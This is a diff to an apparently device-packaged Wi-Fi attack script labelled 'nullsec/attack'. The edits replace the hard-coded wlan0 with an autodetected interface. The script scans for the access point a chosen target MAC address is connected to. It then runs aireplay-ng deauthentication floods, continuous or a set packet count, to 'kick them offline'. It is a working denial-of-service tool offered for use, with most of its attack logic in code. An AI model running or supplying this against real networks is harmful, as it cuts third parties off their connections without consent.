@@ -4,6 +4,11 @@
 # Description: Deauthenticate a specific MAC address from any network
 # Category: nullsec/attack
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 PROMPT "TARGETED DEAUTH
 
 Disconnect a specific
@@ -13,8 +18,6 @@ Enter target MAC address
 to kick them offline.
 
 Press OK to configure."
-
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
 
 TARGET_MAC=$(MAC_PICKER "Target Device MAC:")
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) 
@@ -39,7 +42,7 @@ CHANNEL=""
 
 if [ "$MODE" -eq 1 ]; then
     SPINNER_START "Scanning for target..."
-    timeout 15 airodump-ng wlan0 --write-interval 1 -w /tmp/targetscan --output-format csv 2>/dev/null
+    timeout 15 airodump-ng $IFACE --write-interval 1 -w /tmp/targetscan --output-format csv 2>/dev/null
     SPINNER_STOP
     
     # Find which AP the target is connected to
@@ -90,12 +93,12 @@ Packets: $PACKETS
 Press OK to attack.")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-iwconfig wlan0 channel $CHANNEL 2>/dev/null
+iwconfig $IFACE channel $CHANNEL 2>/dev/null
 
 LOG "Deauthing $TARGET_MAC..."
 
 if [ "$CONTINUOUS" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
-    aireplay-ng -0 0 -a "$BSSID" -c "$TARGET_MAC" wlan0 &
+    aireplay-ng -0 0 -a "$BSSID" -c "$TARGET_MAC" $IFACE &
     DEAUTH_PID=$!
     
     PROMPT "DEAUTH ACTIVE
@@ -107,7 +110,7 @@ Press OK to STOP."
     
     kill $DEAUTH_PID 2>/dev/null
 else
-    aireplay-ng -0 $PACKETS -a "$BSSID" -c "$TARGET_MAC" wlan0
+    aireplay-ng -0 $PACKETS -a "$BSSID" -c "$TARGET_MAC" $IFACE
 fi
 
 PROMPT "DEAUTH COMPLETE
